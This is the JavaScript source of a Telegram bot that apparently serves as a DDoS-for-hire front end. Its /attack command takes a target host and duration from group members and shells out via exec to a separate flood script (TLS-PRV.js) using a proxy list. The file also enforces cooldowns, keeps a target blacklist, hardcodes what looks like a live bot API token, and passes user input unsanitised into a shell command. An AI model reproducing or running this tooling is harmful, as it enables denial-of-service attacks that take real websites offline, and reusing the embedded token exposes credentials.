const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

const API_TOKEN = '8101073327:AAF2azfD-lVUfRmOxnPZjAWVtC_q2Z5_yII';
const bot = new TelegramBot(API_TOKEN, { polling: true });

const adminId = '7378397435';
const allowedGroupId = '-1002450610630'; // Ganti dengan ID grup yang diizinkan
let botEnabled = true;

let now = new Date();
let year = now.getFullYear();
let month = String(now.getMonth() + 1).padStart(2, '0');
let hours = String(now.getHours()).padStart(2, '0');

let cooldownActive = false;
let attackInProgress = false;
let currentAttackTarget = null;
let blacklist = [
    'https://google.com',
    'https://slot-terbaru.com/RECEH303/',
    'https://dstat.layer7dstat.uk/',
    'https://zetvideo.net/',
    'https://cfcybernews.eu',
    'https://yilan88.top/',
    'https://l7dstat.com/',
    'https://bandung.go.id/',
    'https://layer7.request123.xyz/',
    'https://www.fbi.gov/',
    'https://yandex.com',
    'https://telegram.org',
    'https://facebook.com',
    'https://youtube.com/',
    'https://neerd.my.id'
]; // Daftar target web yang di-blacklist

bot.onText(/\/attack(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    const messageId = msg.message_id;

    if (botEnabled) {
        if (chatId === allowedGroupId && (msg.chat.type === 'group' || msg.chat.type === 'supergroup')) {
            if (attackInProgress) {
                bot.sendMessage(chatId, 'An attack is already in progress. Please wait until it finishes.', { reply_to_message_id: messageId });
                return;
            }

            const args = match[1] ? match[1].split(' ') : [];
            if (args.length === 2) {
                const host = args[0];
                const time = args[1];

                if (blacklist.some(bl => host.includes(bl))) {
                    bot.sendMessage(chatId, `Target ${host} is blacklisted and cannot be attacked.`, { reply_to_message_id: messageId });
                    return;
                }

                const timeInt = parseInt(time, 10);
                if (!isNaN(timeInt) && timeInt > 0 && timeInt <= 60) {
                    if (!cooldownActive) {
                        attackInProgress = true;
                        currentAttackTarget = host;
                        exec(`node TLS-PRV.js ${host} ${time} 20 18 proxy.txt`, (error, stdout, stderr) => {
                            attackInProgress = false;
                            currentAttackTarget = null;
                            if (error) {
                                bot.sendMessage(chatId, `✅Attack complete ${stderr}`, { reply_to_message_id: messageId });
                                return;
                            }
                            bot.sendMessage(chatId, `✅ The attack on ${host} is complete.`, { reply_to_message_id: messageId });
                            cooldownActive = true;
                            setTimeout(() => {
                                cooldownActive = false;
                                bot.sendMessage(allowedGroupId, 'Cooldown period is over. Bot is now available for attack.');
                            }, 60000); // 60 detik cooldown
                        });
                        bot.sendMessage(chatId, `🚀 Attack sent!! 🚀\n\nTarget: ${host}\nDuration: ${time} seconds\nStart Attack: ${year}-${month}-${hours}\nCount: 1/1 slot`, {
                            reply_to_message_id: messageId,
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: 'THIS BOT ONLY HAS 50% POWER', url: 'https://t.me/silly_cat_service' }]
                                ]
                            }
                        });
                    } else {
                        bot.sendMessage(chatId, 'Bot is currently on cooldown. Please wait.', { reply_to_message_id: messageId });
                    }
                } else {
                    bot.sendMessage(chatId, 'Invalid time. Please specify a time between 1 and 300 seconds.', { reply_to_message_id: messageId });
                }
            } else {
                bot.sendMessage(chatId, 'Usage: /attack [HOST] [TIME], user 1 server, 4gb:)', { reply_to_message_id: messageId });
            }
        } else {
            bot.sendMessage(chatId, 'You can only use the /attack command in the main group https://t.me/silly_cat_public', { reply_to_message_id: messageId });
        }
    } else {
        bot.sendMessage(chatId, 'Disabled all commands for this group.', { reply_to_message_id: messageId });
    }
});

bot.onText(/\/set all start/, (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (chatId === allowedGroupId && (msg.chat.type === 'group' || msg.chat.type === 'supergroup')) {
        if (userId === adminId) {
            botEnabled = true;
            bot.sendMessage(chatId, 'Enabled all commands for this group.');
        } else {
            bot.sendMessage(chatId, 'You are not authorized to use this command.');
        }
    } else {
        bot.sendMessage(chatId, 'This command can only be used in the authorized group.');
    }
});

bot.onText(/\/set all stop/, (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (chatId === allowedGroupId && (msg.chat.type === 'group' || msg.chat.type === 'supergroup')) {
        if (userId === adminId) {
            botEnabled = false;
            bot.sendMessage(chatId, 'Disabled all commands for this group.');
        } else {
            bot.sendMessage(chatId, 'You are not authorized to use this command.');
        }
    } else {
        bot.sendMessage(chatId, 'This command can only be used in the authorized group.');
    }
});

bot.onText(/\/blacklist (.+)/, (msg, match) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();

    if (chatId === allowedGroupId && (msg.chat.type === 'group' || msg.chat.type === 'supergroup')) {
        if (userId === adminId) {
            const site = match[1];
            if (!blacklist.includes(site)) {
                blacklist.push(site);
                bot.sendMessage(chatId, `The site ${site} has been added to the blacklist.`);
            } else {
                bot.sendMessage(chatId, `The site ${site} is already in the blacklist.`);
            }
        } else {
            bot.sendMessage(chatId, 'You are not authorized to use this command.');
        }
    } else {
        bot.sendMessage(chatId, 'This command can only be used in the authorized group.');
    }
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id.toString();
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'Start', callback_data: 'start_usage' }]
            ]
        }
    };
    bot.sendMessage(chatId, 'Click "Start" for usage instructions.', opts);
});

bot.onText(/\/ongoing/, (msg) => {
    const chatId = msg.chat.id.toString();
    if (attackInProgress) {
        bot.sendMessage(chatId, `│   HOST & TIME   │\n\nHost: ${currentAttackTarget}\nDuration: 60s`);
    } else {
        bot.sendMessage(chatId, '(404) Not Found');
    }
});

bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const chatId = message.chat.id.toString();

    if (callbackQuery.data === 'start_usage') {
        bot.sendMessage(chatId, 'Usage: /attack [HOST] [TIME]');
    }
});
